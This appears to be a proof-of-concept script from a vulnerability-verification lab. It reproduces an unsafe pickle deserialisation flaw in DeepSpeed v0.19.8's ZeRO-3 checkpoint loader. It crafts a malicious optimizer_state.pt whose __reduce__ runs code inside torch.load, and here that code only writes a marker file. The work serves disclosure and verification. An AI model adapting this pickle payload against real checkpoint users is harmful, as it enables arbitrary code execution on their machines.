"""deepspeed-stage3-py-torch-load-unsafe-l3660-ast dynamic reproduction (DeepSpeed v0.19.8 ZeRO-3 checkpoint loader).

The pinned upstream ``deepspeed/runtime/zero/stage3.py`` is executed verbatim.
Only the DeepSpeed package tree around it is stubbed (no CUDA, no MSVC, Windows
host) through ``lab.upstream_verify.stublib``; ``torch`` is the real installed
build and the sink is the real upstream ``torch.load`` call with an explicit
``weights_only=False``.

Vulnerable path: whoever can write ``zero/optimizer_state.pt`` (or the
per-parameter ``<key>.pt`` files) inside a ZeRO-3 universal checkpoint
directory controls the pickle that ``load_hp_checkpoint_state_from_checkpoint_dir_stage3`` deserialises.

Proof: unpickling the checkpoint writes the marker file through a reducing
payload, i.e. code execution happens inside ``torch.load``.
"""

from __future__ import annotations

import collections
import json
import math
import os
import pickle
import sys
import types
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[3]))
import poclib  # noqa: E402

sys.path.insert(0, str(Path(__file__).resolve().parents[3] / "lab" / "upstream_verify"))
from stublib import StubTree  # noqa: E402

CASE_LINE = 3660
CASE_KIND = 'optimizer_state'


class _StateDict(dict):
    """dict that manufactures the keys the loader expects after unpickling."""

    def __getitem__(self, key):
        if key not in self:
            dict.__setitem__(self, key, {"state": [{"step": 1}], "param_groups": [{}]})
        return dict.__getitem__(self, key)


def _materialize(marker_path: str, marker_text: str, output):
    """Runs inside torch.load(); this is the code-execution primitive."""
    Path(marker_path).write_text(marker_text, encoding="utf-8")
    return output


class _Payload:
    def __init__(self, marker_path: str, marker_text: str, output):
        self.marker_path = marker_path
        self.marker_text = marker_text
        self.output = output

    def __reduce__(self):
        return (_materialize, (self.marker_path, self.marker_text, self.output))


def main() -> None:
    import torch

    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
    source = poclib.upstream_path(manifest["root_cause"]["source"])
    if not source.is_file():
        poclib.fail(f"missing pinned upstream source: {source}")

    tree = StubTree(["deepspeed"]).install()
    partition = tree.seed(
        "deepspeed.runtime.zero.partition_parameters",
        torch=torch,
        math=math,
        os=os,
        collections=collections,
        defaultdict=collections.defaultdict,
    )
    tree.seed_leaks("deepspeed.runtime.zero.partition_parameters", source)
    tree.seed(
        "deepspeed.comm",
        get_rank=lambda group=None: 0,
        get_world_size=lambda group=None: 1,
    )
    module = tree.load(source, "uv_deepspeed_stage3")
    if not hasattr(module, "DeepSpeedZeroOptimizer_Stage3"):
        poclib.fail("upstream stage3 module did not expose DeepSpeedZeroOptimizer_Stage3")

    poclib.start_marker("ABSENT")
    marker = str(poclib.MARKER_FILE)
    text = poclib.MARKER_TEXT

    work = poclib.EVIDENCE_DIR / "ckpt"
    if work.exists():
        import shutil

        shutil.rmtree(work)
    zero = work / "zero"
    zero.mkdir(parents=True)

    cls = module.DeepSpeedZeroOptimizer_Stage3
    optimizer = object.__new__(cls)

    if CASE_KIND == "optimizer_state":
        payload = _Payload(marker, text, _StateDict())
        (zero / "optimizer_state.pt").write_bytes(pickle.dumps(payload, protocol=4))
        optimizer.fp16_groups = []
        optimizer.fp32_partitioned_groups_flat = []
        optimizer.fp16_partitioned_groups_flat = []
        optimizer.fp16_partitioned_groups = []
        optimizer.param_names = {}
        optimizer.swap_optimizer = False
        optimizer.optimizer = types.SimpleNamespace(param_groups=[])
        optimizer.loss_scaler = None
        optimizer.dynamic_loss_scale = None
        optimizer.overflow = False
        checkpoint_target = work
    else:
        payload = _Payload(marker, text, torch.zeros(8, dtype=torch.float32))
        (zero / "exp_avg.pt").write_bytes(pickle.dumps(payload, protocol=4))
        optimizer.dp_process_group = None
        checkpoint_target = zero

    sink_error = None
    result = None
    try:
        if CASE_KIND == "optimizer_state":
            result = optimizer.load_hp_checkpoint_state_from_checkpoint_dir_stage3(str(checkpoint_target))
        else:
            result = optimizer.load_hp_checkpoint_state(str(checkpoint_target), "exp_avg")
    except Exception as exc:  # the sink has already run at this point
        sink_error = f"{type(exc).__name__}: {exc}"

    if not poclib.marker_ok():
        poclib.fail("marker was not written by the upstream torch.load sink", sink_error=sink_error)

    poclib.finish_verified(
        {
            "transport": {
                "type": "function+torch.load",
                "entrypoint": "deepspeed.runtime.zero.stage3.DeepSpeedZeroOptimizer_Stage3.load_hp_checkpoint_state_from_checkpoint_dir_stage3",
                "source": poclib.rel(source),
                "source_sha256": poclib.sha256_file(source),
                "sink_line": CASE_LINE,
                "sink": 'optim_sd = torch.load(optim_state_path, weights_only=False)',
                "torch_version": torch.__version__,
                "checkpoint_file": poclib.rel(zero / "optimizer_state.pt"),
                "payload": "pickle __reduce__ -> _materialize(marker)",
                "post_sink_error": sink_error,
                "result_type": type(result).__name__,
                "stubbed_modules": tree.manifest()["stubbed_modules"],
            },
            "request_response": [
                {
                    "dir": "untrusted checkpoint dir -> torch.load(weights_only=False)",
                    "payload": "pickle reduce",
                    "result": "marker written before any state validation",
                }
            ],
            "state_before": "marker=ABSENT",
            "state_after": "marker contains proof text",
        }
    )


if __name__ == "__main__":
    main()
